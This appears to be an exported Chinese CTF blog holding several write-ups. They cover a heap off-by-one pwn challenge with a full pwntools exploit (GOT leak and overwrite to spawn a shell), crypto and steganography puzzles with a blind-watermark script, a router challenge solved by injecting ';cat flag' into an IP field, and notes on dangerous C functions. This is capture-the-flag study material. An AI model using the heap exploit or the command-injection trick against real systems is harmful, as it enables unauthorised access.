<h3 id="mid-pwn"><a href="#mid-pwn" class="headerlink" title="mid_pwn"></a>mid_pwn</h3><p><img src="/img/image-20210825214846902.png" alt="image-20210825214846902"></p>
<p>ida打开后，看见menu函数，五个功能</p>
<p>Create_Heap函数</p>
<p><img src="/img/image-20210825215031703.png" alt="image-20210825215031703"></p>
<p>读完后发现有两次malloc，就意味着申请了两次，第一个chunk可以看作是记录的作用，里面存放着第二个chunk的size和指针，同时，第一个chunk的地址指针保存在bss段中heaparray数组这里，两个大小都是0x20的chunk，举个例子方便理解</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">0x603000</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000021</span></span><br><span class="line"><span class="attribute">0x603010</span>: <span class="number">0</span>x<span class="number">0000000000000010</span> <span class="number">0</span>x<span class="number">0000000000603030</span> (chunk<span class="number">0</span>的大小和指针）</span><br><span class="line"><span class="attribute">0x603020</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000021</span> (chunk<span class="number">0</span>)</span><br><span class="line"><span class="attribute">0x603030</span>: <span class="number">0</span>x<span class="number">0000000</span>a<span class="number">61616161</span> <span class="number">0</span>x<span class="number">0000000000000000</span> (“aaaa”)</span><br><span class="line"><span class="attribute">0x603040</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000021</span></span><br><span class="line"><span class="attribute">0x603050</span>: <span class="number">0</span>x<span class="number">0000000000000010</span> <span class="number">0</span>x<span class="number">0000000000603070</span> (chunk<span class="number">1</span>的大小和指针）</span><br><span class="line"><span class="attribute">0x603060</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000021</span> (chunk<span class="number">1</span>)</span><br><span class="line"><span class="attribute">0x603070</span>: <span class="number">0</span>x<span class="number">0000000</span>a<span class="number">62626262</span> <span class="number">0</span>x<span class="number">0000000000000000</span> (“bbbb”)</span><br><span class="line"><span class="attribute">0x603080</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000020</span>f<span class="number">81</span> (top chunk)</span><br><span class="line"><span class="attribute">0x603090</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x6030a0</span>: <span class="number">0</span>x<span class="number">0000000000000000</span> <span class="number">0</span>x<span class="number">0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>然后是edit_heap函数</p>
<p><img src="/img/image-20210825215827003.png" alt="image-20210825215827003"></p>
<p>在这里发现了off-by-one漏洞</p>
<p>show_heap函数：</p>
<p><img src="/img/image-20210825215943902.png" alt="image-20210825215943902"></p>
<p>最后的delete_heap函数读出最后会把之前申请到的两个chunk都free掉</p>
<p><img src="/img/image-20210825220059801.png" alt="image-20210825220059801"></p>
<h4 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h4><p><strong>1.利用 off by one 漏洞覆盖下一个 chunk 的 size 字段，从而构造伪造的 chunk 大小。<br> 2.申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</strong></p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;175.24.233.124&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">length,value</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(length)))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">	r.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,value</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">	r.sendline(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	r.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	r.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">int</span>(index)))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x81&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">size = <span class="string">b&#x27;\x08&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x40</span>+ size + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr = u64(r.recvuntil(<span class="string">&#x27;Done&#x27;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr)</span><br><span class="line">system_addr=free_addr+libc.dump(<span class="string">&quot;system&quot;</span>)-libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto:"></a>Crypto:</h2><h3 id="tik-tak"><a href="#tik-tak" class="headerlink" title="tik-tak"></a>tik-tak</h3><p>根据提示键盘码，坐标轴那种，于是验证猜想，看到文档名称是tiktiktaktak，于是所有都回移一层，比如66该是第六行第二列，因为是两个6，但题目本身重叠，所以就该是第六行第一列，以此类推得出结果</p>
<h2 id="MISC："><a href="#MISC：" class="headerlink" title="MISC："></a>MISC：</h2><h3 id="缩小查看更多"><a href="#缩小查看更多" class="headerlink" title="缩小查看更多"></a>缩小查看更多</h3><p>这个题，我的方法比较硬来，直接stegsolve打开，看照片层，隐约明显能看清</p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825221547.png"></p>
<p><img src="/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210825221552.png"></p>
<h3 id="仅仅是流量分析？"><a href="#仅仅是流量分析？" class="headerlink" title="仅仅是流量分析？"></a>仅仅是流量分析？</h3><p>根据hint</p>
<p><img src="/img/image-20210825221847222.png" alt="image-20210825221847222"></p>
<p>ftm文件，rar损坏</p>
<p>ftm文件解压点开后还有个key.pcap文件</p>
<p>wireshark打开发现数据包，脚本得到数据包内容</p>
<p>然后010打开rar文件，发现文件块位置错误，修改后正常解压</p>
<p>打开发现233.png</p>
<p>stegsolve打开233.png，逐层找，找到一个二维码，扫码后拿到flag原样，结合xinan发现是维吉尼亚密码，再解密后又是栅栏密码，最后拿到flag</p>
<p><img src="/img/image-20210825222821574.png" alt="image-20210825222821574"></p>
<h3 id="可爱猫猫"><a href="#可爱猫猫" class="headerlink" title="可爱猫猫"></a>可爱猫猫</h3><p>两张表面上一样的图片</p>
<p>盲水印的问题，用github上的脚本</p>
<p><a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a></p>
<p>跑出结果</p>
<p><img src="/img/flag.png"></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">cmd = <span class="literal">None</span></span><br><span class="line">debug = <span class="literal">False</span></span><br><span class="line">seed = <span class="number">20160930</span></span><br><span class="line">oldseed = <span class="literal">False</span></span><br><span class="line">alpha = <span class="number">3.0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;-h&#x27;</span> <span class="keyword">in</span> sys.argv <span class="keyword">or</span> <span class="string">&#x27;--help&#x27;</span> <span class="keyword">in</span> sys.argv <span class="keyword">or</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Usage: python bwm.py &lt;cmd&gt; [arg...] [opts...]&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;  cmds:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    encode &lt;image&gt; &lt;watermark&gt; &lt;image(encoded)&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;           image + watermark -&gt; image(encoded)&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    decode &lt;image&gt; &lt;image(encoded)&gt; &lt;watermark&gt;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;           image + image(encoded) -&gt; watermark&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;  opts:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --debug,          Show debug&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --seed &lt;int&gt;,     Manual setting random seed (default is 20160930)&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --oldseed         Use python2 random algorithm.&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;    --alpha &lt;float&gt;,  Manual setting alpha (default is 3.0)&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    cmd = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd != <span class="string">&#x27;encode&#x27;</span> <span class="keyword">and</span> cmd != <span class="string">&#x27;decode&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Wrong cmd %s&#x27;</span> % cmd)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--debug&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        debug = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">del</span> sys.argv[sys.argv.index(<span class="string">&#x27;--debug&#x27;</span>)]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--seed&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        p = sys.argv.index(<span class="string">&#x27;--seed&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt;= p+<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;Missing &lt;int&gt; for --seed&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        seed = <span class="built_in">int</span>(sys.argv[p+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--oldseed&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        oldseed = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">del</span> sys.argv[sys.argv.index(<span class="string">&#x27;--oldseed&#x27;</span>)]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;--alpha&#x27;</span> <span class="keyword">in</span> sys.argv:</span><br><span class="line">        p = sys.argv.index(<span class="string">&#x27;--alpha&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt;= p+<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&#x27;Missing &lt;float&gt; for --alpha&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        alpha = <span class="built_in">float</span>(sys.argv[p+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">del</span> sys.argv[p]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;Missing arg...&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    fn1 = sys.argv[<span class="number">2</span>]</span><br><span class="line">    fn2 = sys.argv[<span class="number">3</span>]</span><br><span class="line">    fn3 = sys.argv[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># OpenCV是以(BGR)的顺序存储图像数据的</span></span><br><span class="line"><span class="comment"># 而Matplotlib是以(RGB)的顺序显示图像的</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bgr_to_rgb</span>(<span class="params">img</span>):</span></span><br><span class="line">    b, g, r = cv2.split(img)</span><br><span class="line">    <span class="keyword">return</span> cv2.merge([r, g, b])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cmd == <span class="string">&#x27;encode&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;image&lt;%s&gt; + watermark&lt;%s&gt; -&gt; image(encoded)&lt;%s&gt;&#x27;</span> % (fn1, fn2, fn3))</span><br><span class="line">    img = cv2.imread(fn1)</span><br><span class="line">    wm = cv2.imread(fn2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">231</span>), plt.imshow(bgr_to_rgb(img)), plt.title(<span class="string">&#x27;image&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">234</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print img.shape # 高, 宽, 通道</span></span><br><span class="line">    h, w = img.shape[<span class="number">0</span>], img.shape[<span class="number">1</span>]</span><br><span class="line">    hwm = np.zeros((<span class="built_in">int</span>(h * <span class="number">0.5</span>), w, img.shape[<span class="number">2</span>]))</span><br><span class="line">    <span class="keyword">assert</span> hwm.shape[<span class="number">0</span>] &gt; wm.shape[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">assert</span> hwm.shape[<span class="number">1</span>] &gt; wm.shape[<span class="number">1</span>]</span><br><span class="line">    hwm2 = np.copy(hwm)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(wm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(wm.shape[<span class="number">1</span>]):</span><br><span class="line">            hwm2[i][j] = wm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> oldseed: random.seed(seed,version=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>: random.seed(seed)</span><br><span class="line">    m, n = <span class="built_in">list</span>(<span class="built_in">range</span>(hwm.shape[<span class="number">0</span>])), <span class="built_in">list</span>(<span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">if</span> oldseed:</span><br><span class="line">        random.shuffle(m,random=random.random)</span><br><span class="line">        random.shuffle(n,random=random.random)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random.shuffle(m)</span><br><span class="line">        random.shuffle(n)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]):</span><br><span class="line">            hwm[i][j] = hwm2[m[i]][n[j]]</span><br><span class="line"></span><br><span class="line">    rwm = np.zeros(img.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(hwm.shape[<span class="number">1</span>]):</span><br><span class="line">            rwm[i][j] = hwm[i][j]</span><br><span class="line">            rwm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = hwm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">235</span>), plt.imshow(bgr_to_rgb(rwm)), \</span><br><span class="line">            plt.title(<span class="string">&#x27;encrypted(watermark)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    f1 = np.fft.fft2(img)</span><br><span class="line">    f2 = f1 + alpha * rwm</span><br><span class="line">    _img = np.fft.ifft2(f2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">232</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    img_wm = np.real(_img)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> cv2.imwrite(fn3, img_wm, [<span class="built_in">int</span>(cv2.IMWRITE_JPEG_QUALITY), <span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这里计算下保存前后的(溢出)误差</span></span><br><span class="line">    img_wm2 = cv2.imread(fn3)</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(img_wm.shape[<span class="number">2</span>]):</span><br><span class="line">                <span class="built_in">sum</span> += np.power(img_wm[i][j][k] - img_wm2[i][j][k], <span class="number">2</span>)</span><br><span class="line">    miss = np.sqrt(<span class="built_in">sum</span>) / (img_wm.shape[<span class="number">0</span>] * img_wm.shape[<span class="number">1</span>] * img_wm.shape[<span class="number">2</span>]) * <span class="number">100</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;Miss %s%% in save&#x27;</span> % miss)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">233</span>), plt.imshow(bgr_to_rgb(np.uint8(img_wm))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;image(encoded)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    f2 = np.fft.fft2(img_wm)</span><br><span class="line">    rwm = (f2 - f1) / alpha</span><br><span class="line">    rwm = np.real(rwm)</span><br><span class="line"></span><br><span class="line">    wm = np.zeros(rwm.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[m[i]][n[j]] = np.uint8(rwm[i][j])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = wm[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="keyword">assert</span> cv2.imwrite(<span class="string">&#x27;_bwm.debug.wm.jpg&#x27;</span>, wm)</span><br><span class="line">        plt.subplot(<span class="number">236</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">u&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> cmd == <span class="string">&#x27;decode&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;image&lt;%s&gt; + image(encoded)&lt;%s&gt; -&gt; watermark&lt;%s&gt;&#x27;</span> % (fn1, fn2, fn3))</span><br><span class="line">    img = cv2.imread(fn1)</span><br><span class="line">    img_wm = cv2.imread(fn2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">231</span>), plt.imshow(bgr_to_rgb(img)), plt.title(<span class="string">&#x27;image&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">234</span>), plt.imshow(bgr_to_rgb(img_wm)), plt.title(<span class="string">&#x27;image(encoded)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> oldseed: random.seed(seed,version=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>: random.seed(seed)</span><br><span class="line">    m, n = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">int</span>(img.shape[<span class="number">0</span>] * <span class="number">0.5</span>))), <span class="built_in">list</span>(<span class="built_in">range</span>(img.shape[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">if</span> oldseed:</span><br><span class="line">        random.shuffle(m,random=random.random)</span><br><span class="line">        random.shuffle(n,random=random.random)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        random.shuffle(m)</span><br><span class="line">        random.shuffle(n)</span><br><span class="line"></span><br><span class="line">    f1 = np.fft.fft2(img)</span><br><span class="line">    f2 = np.fft.fft2(img_wm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">232</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line">        plt.subplot(<span class="number">235</span>), plt.imshow(bgr_to_rgb(np.real(f1))), \</span><br><span class="line">            plt.title(<span class="string">&#x27;fft(image(encoded))&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    rwm = (f2 - f1) / alpha</span><br><span class="line">    rwm = np.real(rwm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">233</span>), plt.imshow(bgr_to_rgb(rwm)), \</span><br><span class="line">            plt.title(<span class="string">&#x27;encrypted(watermark)&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    wm = np.zeros(rwm.shape)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[m[i]][n[j]] = np.uint8(rwm[i][j])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(rwm.shape[<span class="number">0</span>] * <span class="number">0.5</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rwm.shape[<span class="number">1</span>]):</span><br><span class="line">            wm[rwm.shape[<span class="number">0</span>] - i - <span class="number">1</span>][rwm.shape[<span class="number">1</span>] - j - <span class="number">1</span>] = wm[i][j]</span><br><span class="line">    <span class="keyword">assert</span> cv2.imwrite(fn3, wm)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.subplot(<span class="number">236</span>), plt.imshow(bgr_to_rgb(wm)), plt.title(<span class="string">u&#x27;watermark&#x27;</span>)</span><br><span class="line">        plt.xticks([]), plt.yticks([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_router</title>
    <url>/2022/01/21/%E5%88%B7%E6%96%B0%E4%B8%89%E8%A7%82%E7%AC%AC%E4%B8%80%E9%A2%98(bjdctf_2020_router)/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="刷新三观第一题-bjdctf-2020-router"><a href="#刷新三观第一题-bjdctf-2020-router" class="headerlink" title="刷新三观第一题(bjdctf_2020_router)"></a>刷新三观第一题(bjdctf_2020_router)</h2><p><del>昨天本来已经没想到，但今天更没想到</del></p>
<p>这是一个考察linux中命令方式的题，直接就不需要IDA查看文件</p>
<p>Linux中打开，连接靶机</p>
<p><img src="/img/1643120285905.png" alt="1643120285905"></p>
<p>界面就这样，让你选</p>
<p>我选了1</p>
<p><img src="/img/1643120297383.png" alt="1643120297383"></p>
<p>然后让我输入ip地址，我觉得有猫腻，想到Linux有一个指令用法</p>
<p><code>命令1+；+命令2</code> 这样的格式两种指令都会执行</p>
<p>然后我果断;cat flag</p>
<p><img src="/img/1643120311348.png" alt="1643120311348"></p>
<p>哈哈哈，出来了，<del>放在第二页可真是有含金量</del></p>
<p>下班！</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>一些危险函数和64位寄存器与32位不同之处</title>
    <url>/2021/06/26/%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C64%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E32%E4%BD%8D%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
    <content><![CDATA[<span id="more"></span>
<p>列举一下常见的危险函数：</p>
<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
    scanf
    vscanf
</code></pre>
<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
</code></pre>
